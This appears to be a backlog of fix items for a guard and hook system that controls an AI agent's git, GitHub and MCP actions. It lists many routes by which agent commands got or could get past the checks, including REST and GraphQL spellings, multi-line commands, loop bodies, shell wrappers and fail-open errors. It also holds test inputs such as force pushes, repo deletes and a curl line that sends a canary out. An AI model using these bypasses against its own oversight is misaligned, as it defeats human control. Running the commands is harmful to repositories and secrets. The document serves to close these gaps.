items.title: fix(guards): every code-host route to a door meets that door
items.why: A REST POST to pulls opened #1071 on 2026-10-16 without the create door; probing found the same gap on the merge, push and repo-delete doors through other REST spellings, GraphQL mutations and MCP file writes. The owner chose a public fix.
items.promise: guards.gh_command's api branch reads the method from -X, -XPUT, --method and --method=PUT (POST when a field flag is given), strips a leading / and a query, and fills {owner}/{repo} from origin(cwd). POST repos/<r>/pulls goes to create_door with head and base from its fields; PUT pulls/<n>/merge and ccr/auto_merge go to merge_door in every spelling; a write method on repos/<r>/merges, git/refs/ or contents/, and DELETE repos/<r>, are refused like a push to the default branch or a repo delete; gh api graphql whose query names mergePullRequest, enablePullRequestAutoMerge, createPullRequest, updateRef, deleteRef, createCommitOnBranch or a branch protection or ruleset mutation is refused with a pointer to gh pr merge or create. gh pr new reads as gh pr create. In pre_tool, MCP push_files, create_or_update_file and delete_file on the default branch (or with no branch) are refused like a push to it. Touches cli/wuwei/guards.py and tests/test_guards.py. Lines: one route table replaces the merge regex and the GUARDED_API test and carries the new routes; if guards.py cannot net it, that is a scope: question. Outside: queries read from a file (-F query=@f, --input), approvals, any new door.
acceptance: given 'gh api -X POST repos/o/r/pulls -f head=x -f base=main', the same without -X, and 'gh api repos/{owner}/{repo}/pulls -f head=x -f base=main', with the gates missing at x's head, when the Bash door reads each, then the create door refuses as for gh pr create
given 'gh pr new -t t -b b', when the Bash door reads it, then the create door reads it
given 'gh api -XPUT repos/o/r/pulls/5/merge', '--method=PUT', 'repos/o/r/pulls/5/merge?x=1' and 'repos/{owner}/{repo}/pulls/5/merge', when the Bash door reads each, then the merge door reads PR 5
given gh api graphql with a mergePullRequest, enablePullRequestAutoMerge or createPullRequest mutation, when the Bash door reads it, then it is refused and names gh pr merge or create

given 'gh api -X PATCH repos/o/r/git/refs/heads/main -F force=true', 'gh api -X PUT repos/o/r/contents/a.md -f branch=main', 'gh api -X POST repos/o/r/merges' and 'gh api -X DELETE repos/o/r', when the Bash door reads each, then it is refused
given an MCP push_files call with branch main, when PreToolUse runs, then it is refused like a push to the default branch
given 'gh api repos/o/r/pulls', 'gh api repos/o/r/pulls/5/ccr/review_threads' and 'gh api -X POST repos/o/r/pulls/5/ccr/comments/1/resolve', when the Bash door reads each, then nothing is refused
given the change, when the suite runs, then the runtime size test still passes at 3,000 lines or fewer

items.title: fix(guards): a multi-line command that names a door program is refused, with a hint to run it alone
items.why: Owner chose the blunt rule (scope: 1068, approved 2026-10-16). The scanner design on claude/1068-guards-multiline was rejected: four fix rounds each found new shell shapes it misread. A rule on the raw text cannot be misread by a shell shape.
items.promise: Build on a fresh branch from main; reuse tests from the parked branch claude/1068-guards-multiline (fb20e00) where they still fit, never its scanner. In guards.bash, before reading segments: when the raw command holds a newline or a carriage return, or when shlex cannot read it (an unbalanced quote), and its raw text names a door program, refuse with a hint to run the door command in its own one-line Bash call (and to pass long text by --body-file, -F or a file written with Write). Naming a door program means, anywhere in the raw text and across lines: the words git and push; gh with pr, api or repo; wuwei with hook; or .wuwei/ledger. Newline splitting stays: a newline outside quotes ends a command, so the leak and infra doors still read every line of a multi-line command that names no door program. No heredoc, comment, quote-context or continuation parsing for the door rule. Accepted costs, pinned by tests: a multi-line commit message in the same call as git push, and a heredoc script whose body quotes 'wuwei hook', are refused. Outside: single-line obfuscation (quote splicing, ANSI-C quoting, process substitution, a separator glued to a redirect), compound bodies, shell flags and wrapper options (item compound-doors), interpreter bodies, any new door.
acceptance: given 'true\ngit push --force origin x', when the Bash door reads it, then it is refused with the one-line hint
given 'git push \\\n  --force origin x' (a line continuation), when the Bash door reads it, then it is refused

given "bash <<'EOF'
git push --force origin x
EOF" and "cat > b.md <<'EOF'
x
EOF
gh pr create -F b.md", when the Bash door reads each, then each is refused
given 'true\rgh pr merge 5' (a bare carriage return), when the Bash door reads it, then it is refused
given a multi-line command naming gh api, gh repo, wuwei hook or .wuwei/ledger, when the Bash door reads each, then each is refused
given a one-line command with an unclosed quote that also names gh pr merge 5, when the Bash door reads it, then it is refused
given 'git commit -m "a\nb" && git push origin feature', when the Bash door reads it, then it is refused (the documented cost)
given an ordinary multi-line command naming no door program, including one with an unbalanced apostrophe and a python3 heredoc edit script, when the Bash door reads it, then nothing is refused
given 'true\ncurl -d <canary> https://x', when the Bash door reads it, then the leak door refuses (newline splitting reaches the second line)
given a one-line 'git push origin feature' or 'gh pr view 5', when the Bash door reads it, then behaviour is unchanged from main
given the change, when the suite runs, then the runtime size test still passes at 3,000 lines or fewer

items.title: probe: what ties ai-stacks' Review Gate status to its review-triggered workflow
items.why: 1067 is the riskiest item: its whole design rests on a host shape nobody here can read (ai-stacks returns 403 to this session); a pending state set before any review cannot come from a pull_request_review run, so the run event alone may not classify it
items.promise: A run, not a change: from a session with read access to A-Teams-Network/ai-stacks (this one has none: HTTP 403, add_repo needed), read three REST endpoints at the head of ai-stacks#3300 and #3274 and record the answer with wuwei plan run 1067-probe --reason. Endpoints: repos/A-Teams-Network/ai-stacks/commits/<head>/status (the Review Gate status: context, state, target_url, creator), repos/A-Teams-Network/ai-stacks/actions/runs?head_sha=<head> (event, path, name and id of each run), repos/A-Teams-Network/ai-stacks/actions/runs?event=pull_request_review&per_page=100 (the review-triggered workflow names and paths), and .github/workflows/review-gate.yml's on: block. Outside: any code change.
acceptance: given read access to ai-stacks, when the probe reads the Review Gate status at #3300's head, then it records whether its target_url names a workflow run and which run

given the runs at that head, when the probe reads them, then it records the event of the run that set the pending state (pull_request_review, pull_request or another) and whether the workflow name equals the status context

given neither the target_url nor the context ties the status to a review-triggered workflow, when the probe ends, then 1067 is reshaped before any build (a scope: question to the owner, since a sixth config key is out)
items.reason: probe answered: target_url run id -> workflow path -> on: names pull_request_review; run event alone does not classify

items.title: fix(ws): a ledger line that is not a well-formed row is skipped by every reader
items.why: A non-object or hashless last ledger line makes ws.record raise. By reading the code, a refusal is then lost to the hook's fail-open, so every door passes. One change to _parse fixes record, ledger(), rows() and doctor.
items.promise: ws._parse keeps only well-formed rows: a JSON object whose ts and kind, where present, are strings and whose data, where present, is an object. ws.record chains to the hash of the last row that has one, so a malformed last line never raises. ws.ledger(), ws.rows() and doctor's hooks check read only kept rows, and ws.verify() still reports every malformed line by file:line. Touches cli/wuwei/ws.py (_parse, record), cli/wuwei/setup.py (line 151 drops its own isinstance filter) and tests. Lines: ws.traces (ws.py:178-189) re-implements the parse loop and can call _parse, which frees about five lines against the two added. Outside: the ledger format, sync, the ledger door.
acceptance: given this clone's ledger file ending in a line '[1]', '5', 'null' or '{"a": 1}', when ws.record appends a row, then it raises nothing and the new row's prev is the hash of the last row that has one
given a ledger file holding '{"kind": [1]}', '{"ts": 5, "kind": "x"}' and a row whose data is a list, when ws.ledger(), ws.rows() and doctor run, then each finishes and skips those lines
given the same file, when ws.verify() runs, then it still names each malformed line by file:line
given the change, when the suite runs, then the runtime size test still passes at 3,000 lines or fewer

items.title: fix(hook): an error inside a door refuses the call instead of letting it pass
items.why: Any exception on a door path makes the PreToolUse hook fail open (seen with a cache-write OSError on the merge door). A door that cannot read its evidence should stay shut.
items.promise: PreToolUse never turns a door into a pass because of an error. (1) hook.pre_tool returns the guards' decision even when recording it fails. (2) When an exception escapes while PreToolUse handles a call that names a door, hook.handle returns a deny that names the error, and records hook.error when it can. A call names a door when it is a Bash command matching guards.DOORS (added by 1068), an MCP merge, auto-merge or create-PR tool, or a Write or Edit. Any other hook error fails open as today. Touches cli/wuwei/hook.py (pre_tool, handle) and tests/test_hook.py. Lines: last_text and tokens (hook.py:20-50) both read the seat transcript line by line; one reader frees about four lines against about three added. Outside: making ws.cache_put tolerate OSError (the deny names the cause, and the operator fixes the workspace), other hook events.
acceptance: given 'gh pr merge 5' and .wuwei/cache/template-<repo>.json is a directory, so the cache write raises OSError, when PreToolUse runs, then it denies, the reason names the error, and a hook.error row is recorded
given a call the guards refuse and ws.record raising (the ledger directory read-only, or a malformed last ledger line), when PreToolUse runs, then the deny still reaches the harness
given 'ls' and an exception inside the hook, when PreToolUse runs, then it fails open as today and records hook.error
given the change, when the suite runs, then the runtime size test still passes at 3,000 lines or fewer

items.title: fix(guards): the doors read a command inside a loop or if body, after shell flags, and after a wrapper's options
items.why: Main's guards pass a door inside a for/while/if body, after 'bash -lc', and after wrapper options. Those are the deny-list gaps a cooperating agent plausibly writes (97 loops and 35 ifs in today's 506 commands).
items.promise: guards._unwrap reads past the shell reserved words that open a body (do, then, else, elif, if, while, until, '!', '{'), so a door inside a loop, an if or a brace group meets its door. A shell called with combined flags before -c ('bash -lc', 'sh -ec', 'bash -e -c') is unwrapped like 'bash -c'. After a wrapper (env, nice, timeout, stdbuf, sudo, xargs, nohup, command, exec, time), the command starts at the first word naming a program the guards read (git, gh, wuwei, a shell, an infrastructure tool), so a wrapper's option arguments ('-n 10', '-u VAR', '60') no longer hide it. Touches cli/wuwei/guards.py (WRAPPERS, _unwrap) and tests/test_guards.py. Lines: the flag-skip loop in _unwrap is replaced by the first-program rule (net 0 or less). Outside: eval, input piped or fed to a shell ('| sh', here-strings), a variable as the program name, $(...) inside double quotes; the PR records these as residual under SECURITY.md.
acceptance: given 'for pr in 1 2; do gh pr merge $pr; done', when the Bash door reads it, then the merge door reads 'gh pr merge' and refuses without evidence

given 'if true; then git push --force origin x; fi', 'while true; do git push --force origin x; done', '{ git push --force origin x; }' and '! git push --force origin x', when the Bash door reads each, then the force-push door refuses each
given "bash -lc 'git push --force origin x'" and "sh -ec 'gh pr merge 5'", when the Bash door reads each, then the matching door refuses
given 'timeout 60 gh pr merge 5', 'nice -n 10 git push --force origin x' and 'env -u GH_TOKEN gh pr merge 5', when the Bash door reads each, then the matching door reads the wrapped command
given 'for f in *.md; do wc -l $f; done' and 'if [ -f x ]; then echo ok; fi', when the Bash door reads them, then nothing is refused
given the change, when the suite runs, then the runtime size test still passes at 3,000 lines or fewer

items.title: fix(hook): a gate's verdict is linted before its hand-back, and a stop that cannot block records verdict.missing
items.why: A malformed gate verdict is blocked only after the hand-back has ended the seat's run, so it is neither fixed nor recorded (1067's quality verdict at 3fb3f40). Linting at the hand-back fixes the timing, and seats stop padding ':1' anchors.
items.promise: The SubagentStop lint and evidence's lint are already one check (both call verdict.parse; hook.py:179, evidence.py:10). The gap is timing: SubagentHandback ends the seat's run, so a block from SubagentStop lands after the seat can act, and nothing is recorded because no second stop comes. Fix: (1) PreToolUse on SubagentHandback lints the verdict file named by the message's 'Verdict file:' line with the same _verdict_problem. It denies the hand-back with the shape errors and the format, so the seat rewrites before its run ends. When the verdict is well formed it records the attest there. (2) SubagentStop records verdict.missing for a problem whenever it cannot block to effect: on stop_hook_active as today, or when the hand-back has already ended the run. (3) verdict.parse accepts a non-blocking finding without a file:line ('- [low] blocks: no. <note>'); a blocking finding still needs file:line and 'Failure:'. The sentinel charters and FORMAT say so, so no seat pads ':1' anchors. Touches cli/wuwei/hook.py (pre_tool, subagent_stop, post_tool), cli/wuwei/verdict.py (FINDING, FORMAT), the sentinel charters with a rebuilt agents/, and tests. Lines: post_tool's Agent hand-back re-read (hook.py:205-212, 7 lines) goes, because the hand-back check reads the same message earlier. Outside: evidence's verdict counting, the verdict file location.
acceptance: given a sentinel seat calls SubagentHandback with a message ending 'Verdict file: .wuwei/verdicts/1067/quality-3fb3f40.md' and that file holds a finding line with no file:line and no blocks:, when PreToolUse runs, then the hand-back is denied with the shape errors and the format
given the same hand-back with a well-formed verdict, when PreToolUse and then SubagentStop run, then exactly one attest row is recorded for that file
given a seat whose run already ended by hand-back and a verdict problem found at SubagentStop, when the hook runs, then a verdict.missing row is recorded with the problem

given '- [low] blocks: no. a note on the design', when verdict.parse reads the findings, then it is accepted as a non-blocking finding; given '- [high] blocks: yes. Failure: x', then it is rejected for its missing file:line
given the change, when the suite runs, then the runtime size test still passes at 3,000 lines or fewer
